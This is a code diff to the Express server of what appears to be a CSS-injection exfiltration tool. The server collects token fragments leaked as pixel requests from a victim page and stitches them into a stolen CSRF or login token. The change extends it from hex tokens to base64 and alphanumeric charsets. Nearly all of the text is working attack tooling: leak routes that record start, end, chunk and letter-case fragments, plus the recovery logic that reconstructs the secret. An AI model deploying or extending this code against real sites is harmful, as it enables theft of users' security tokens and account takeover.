@@ -1,9 +1,12 @@
 const express = require('express');
 const path = require('path');
 const crypto = require('crypto');
-const { tryStitch } = require('./lib/stitch');
+const { stitchCharset } = require('./lib/stitch');
 const { mountBlind } = require('./lib/blind-server');
-const { ANCHOR_LENGTH } = require('./public/payload');
+const { chunkRoute, validChunk } = require('./lib/chunks');
+const {
+  ANCHOR_LENGTH, CHARSETS, charsetOf, charsetName, windowSizeFor, alphabetOf, foldWindows, caseBigramsIn,
+} = require('./public/payload');
 
 const G = '\x1b[32m';
 const R = '\x1b[31m';
@@ -58,6 +61,7 @@ const PRESETS = {
     endSelector: '&operation=login',
     tokenLength: 40,
     windowSize: 4,
+    charset: 'hex',
   },
   hidden: {
     selector: 'input[type="hidden"][name="csrf"]',
@@ -67,6 +71,7 @@ const PRESETS = {
     endSelector: '',
     tokenLength: 40,
     windowSize: 4,
+    charset: 'hex',
   },
 };
 
@@ -85,18 +90,36 @@ const PIXEL = Buffer.from(
   'base64'
 );
 
+// A random sample token in the charset.
+function sampleTokenFor(charset, length) {
+  const bytes = crypto.randomBytes(length);
+  switch (charset) {
+    case 'base64': return bytes.toString('base64').slice(0, length);
+    case 'base64url': return bytes.toString('base64url').slice(0, length);
+    case 'alnum': {
+      const alphabet = alphabetOf(CHARSETS.alnum);
+      return Array.from(bytes, b => alphabet[b % alphabet.length]).join('');
+    }
+    default: return bytes.toString('hex').slice(0, length);
+  }
+}
+
 function buildConfig(userConfig) {
   const { tag, selectorPrefix } = parseSelector(userConfig.selector);
   const attribute = userConfig.attribute || 'href';
   const tokenLength = userConfig.tokenLength || 40;
-  // 4-char windows: ~99% single-guess accuracy at 40 chars but ~4 MB of CSS.
-  // 3-char windows: ~260–280 KB, but longer tokens often come back as candidates.
-  const windowSize = Number(userConfig.windowSize) === 3 ? 3 : 4;
+  // hex (default), or alnum/base64/base64url: see CHARSETS in public/payload.js.
+  const charset = charsetName(userConfig.charset);
+  const cs = charsetOf(charset);
+  // Hex: 4-char windows give ~99% single-guess accuracy at 40 chars but ~4 MB
+  // of CSS; 3-char windows ~260–280 KB, but longer tokens often come back as
+  // candidates. Other charsets only offer 3-char windows.
+  const windowSize = windowSizeFor(charset, userConfig.windowSize);
   // How a hidden input's requests reach a rendering element: the next sibling
   // (`sibling`, default) or the root via html:has() (`has`), which survives a
   // hidden element sitting next to the input. Ignored for anchors.
   const hostMode = userConfig.hostMode === 'has' ? 'has' : 'sibling';
-  const sampleToken = crypto.randomBytes(Math.ceil(tokenLength / 2)).toString('hex').slice(0, tokenLength);
+  const sampleToken = sampleTokenFor(charset, tokenLength);
   const valuePrefix = selectorPrefix || userConfig.startSelector;
   const sampleExtra = userConfig.endSelector ? '&state=medium&rememberMe=false' : '';
   const sampleValue = valuePrefix + sampleToken + userConfig.endSelector + sampleExtra;
@@ -112,18 +135,22 @@ function buildConfig(userConfig) {
     sampleHtml = `<${tag} ${attribute}="${sampleValue}">${sampleValue}</${tag}>`;
   }
 
-  const startContext = userConfig.startSelector ? userConfig.startSelector.slice(-2) : '';
-  const endContext = userConfig.endSelector ? userConfig.endSelector.slice(0, 2) : '';
+  // The start/end rules match the known text next to the token. Two chars
+  // are enough for hex, which rarely recurs elsewhere in the attribute, but a
+  // larger alphabet would also match e.g. "n=lo" in "&operation=login", so
+  // other charsets use more of it (each extra char costs ~1-3 KB).
+  const contextLength = cs.cased ? 8 : 2;
+  const startContext = userConfig.startSelector ? userConfig.startSelector.slice(-contextLength) : '';
+  const endContext = userConfig.endSelector ? userConfig.endSelector.slice(0, contextLength) : '';
 
-  // Hex windows in the known text around the token (e.g. "bac" in "callback")
-  // will leak too; the solver treats them as expected leftovers.
-  const contextHexChunks = new Set();
-  const isWindow = new RegExp(`^[0-9a-f]{${windowSize}}$`);
+  // Windows in the known text around the token (e.g. "bac" in "callback")
+  // will leak too, and so will its case pairs; the solver treats them as
+  // expected leftovers.
+  const contextChunks = new Set();
+  const contextCasePairs = new Set();
   for (const str of [valuePrefix, userConfig.endSelector || '', sampleExtra]) {
-    for (let i = 0; i + windowSize <= str.length; i++) {
-      const w = str.slice(i, i + windowSize);
-      if (isWindow.test(w)) contextHexChunks.add(w);
-    }
+    for (const w of foldWindows(str, cs, windowSize)) contextChunks.add(w);
+    for (const p of caseBigramsIn(str, cs)) contextCasePairs.add(p);
   }
 
   return {
@@ -140,9 +167,11 @@ function buildConfig(userConfig) {
       sampleHtml,
       tokenLength,
       windowSize,
+      charset,
       hostMode,
     },
-    contextHexChunks,
+    contextChunks,
+    contextCasePairs,
   };
 }
 
@@ -156,15 +185,16 @@ const PORT = 3000;
 const SETTLE_MS = Number(process.env.FRAG_SETTLE_MS ?? 1000);
 
 function emptyState() {
-  return { start: null, end: null, chunks: new Set(), lastAt: 0, dirty: true, cached: null };
+  return { start: null, end: null, chunks: new Set(), pairs: new Set(), lastAt: 0, dirty: true, cached: null };
 }
 
-let currentConfig, contextHexChunks, tokenLength, state;
+let currentConfig, contextChunks, contextCasePairs, tokenLength, state;
 
 function applyConfig(userConfig) {
   const result = buildConfig(userConfig);
   currentConfig = result.config;
-  contextHexChunks = result.contextHexChunks;
+  contextChunks = result.contextChunks;
+  contextCasePairs = result.contextCasePairs;
   tokenLength = currentConfig.tokenLength;
   state = emptyState();
 }
@@ -181,13 +211,18 @@ app.post('/api/config', (req, res) => {
   console.log(`${D}selector: ${currentConfig.selector}${X}`);
   console.log(`${D}attribute: ${currentConfig.attribute}${X}`);
   console.log(`${D}length: ${currentConfig.tokenLength}${X}`);
+  console.log(`${D}charset: ${currentConfig.charset}${X}`);
   console.log(`${D}window: ${currentConfig.windowSize}${X}`);
   if (currentConfig.tag === 'input') console.log(`${D}host: ${currentConfig.hostMode}${X}`);
   console.log('');
   res.json(currentConfig);
 });
 
-function record(t, c, res) {
+function record(t, c, res, next) {
+  // Routes accept any chunk-like path; only what the current payload can
+  // send is recorded (which also bounds memory).
+  const length = t === 'm' ? currentConfig.windowSize : t === 'c' ? 2 : ANCHOR_LENGTH;
+  if (!validChunk(currentConfig.charset, t, c, length)) return next();
   const now = Date.now();
   // A quiet gap means the previous burst is over. A different start while one
   // is in progress means a second extraction began right after the first
@@ -203,6 +238,9 @@ function record(t, c, res) {
   } else if (t === 'e') {
     state.end = c;
     console.log(`${D}end:${X}   ${c}`);
+  } else if (t === 'c') {
+    state.pairs.add(c);
+    console.log(`${D}case pair #${state.pairs.size}:${X} ${c}`);
   } else {
     state.chunks.add(c);
     console.log(`${D}chunk #${state.chunks.size}:${X} ${c}`);
@@ -213,11 +251,11 @@ function record(t, c, res) {
 }
 
 // Leak routes come before the static files so each pixel skips a disk lookup.
-// Paths only match the lengths the payload uses, which also bounds memory.
-const anchor = `[0-9a-f]{${ANCHOR_LENGTH}}`;
-app.get(`/s/:c(${anchor})`, (req, res) => record('s', req.params.c, res));
-app.get(`/e/:c(${anchor})`, (req, res) => record('e', req.params.c, res));
-app.get('/:c([0-9a-f]{3,4})', (req, res) => record('m', req.params.c, res));
+// Paths only match chunk-like segments of the lengths a payload can use.
+for (const t of ['s', 'e', 'c']) {
+  app.get(`/${t}/:c(${chunkRoute(2, 2)})`, (req, res, next) => record(t, req.params.c, res, next));
+}
+app.get(`/:c(${chunkRoute(3, 4)})`, (req, res, next) => record('m', req.params.c, res, next));
 mountBlind(app, { settleMs: SETTLE_MS, pixel: PIXEL });
 
 app.use(express.static(path.join(__dirname, 'public')));
@@ -233,10 +271,12 @@ app.get('/api/token', (req, res) => {
   if (!state.dirty && state.cached) {
     return res.json(state.cached);
   }
-  const result = tryStitch({ ...state, chunks: [...state.chunks] }, {
+  const result = stitchCharset({ ...state, chunks: [...state.chunks], pairs: [...state.pairs] }, {
+    charset: charsetOf(currentConfig.charset),
     windowSize: currentConfig.windowSize,
     tokenLength,
-    context: contextHexChunks,
+    context: contextChunks,
+    caseContext: contextCasePairs,
   });
   if (result) {
     if (result.candidates) {
@@ -246,12 +286,14 @@ app.get('/api/token', (req, res) => {
     } else {
       console.log(`\n${G}${B}recovered token (${result.length} chars):${X} ${result.token}`);
     }
+    if (result.caseUnresolved) console.log(`${Y}letter case could not be recovered; shown in lowercase${X}`);
     state.cached = {
       status: 'ok',
       token: result.token,
       length: result.length,
       candidates: result.candidates,
       truncated: result.truncated,
+      caseUnresolved: result.caseUnresolved,
     };
   } else {
     state.cached = {
